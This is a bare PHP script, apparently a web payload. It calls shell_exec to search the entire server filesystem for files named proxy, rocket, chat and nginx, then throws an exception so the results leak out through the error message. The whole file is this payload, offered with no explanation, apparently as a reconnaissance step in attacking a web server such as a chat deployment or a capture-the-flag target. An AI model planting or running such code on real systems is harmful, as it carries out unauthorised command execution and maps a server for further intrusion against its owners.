<?php
$output ='';
$output =$output."\n find proxy ".shell_exec (' find / -name "proxy" | xargs');
$output =$output."\n find rocket ".shell_exec (' find / -name "rocket" | xargs');
$output =$output."\n find chat ".shell_exec (' find / -name "chat" | xargs');
$output =$output."\n find nginx ".shell_exec (' find / -name "nginx" | xargs');


throw new Exception("\n SUCCESS  ". $output."\n");
?>
